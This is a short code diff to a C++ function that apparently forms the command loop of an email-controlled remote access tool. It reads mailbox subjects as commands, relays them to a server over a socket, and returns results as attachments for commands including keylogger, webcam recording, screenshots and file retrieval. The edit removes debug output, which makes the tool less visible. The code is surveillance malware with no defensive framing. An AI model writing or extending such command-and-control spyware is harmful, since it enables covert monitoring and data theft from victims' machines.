@@ -161,7 +161,6 @@ int mailMain(Socket socket, GmailAPI g)
 
       // extract mail content to to use as command
       auto body = mailJson["value"][currMailIdx]["bodyPreview"];
-      cout << "body: " << mailJson.dump(4) << endl;
       if (body.is_null())
         body = "";
       string subject = mailJson["value"][currMailIdx]["subject"];
@@ -169,7 +168,7 @@ int mailMain(Socket socket, GmailAPI g)
       string command = subject;
 
       // request to server
-      cout << "Sending payload: " << payload << " to server, waiting for server response..." << endl;
+      cout << "Sending payload"  << endl;
       string res = socket.sendMessage(payload);
       cout << "Server responded." << endl;
       vector<string> hasAttach = {"getfile", "recordwebcam", "keylogger", "screenshot", "listapp", "listservice"};
@@ -183,7 +182,6 @@ int mailMain(Socket socket, GmailAPI g)
       }
       else
       {
-        cout << "Sending mail with attachment: " << res << endl;
         // string extension = "";
         // extension = command == "recordwebcam" ? ".avi":
         //             command == "keylogger" ? ".txt":
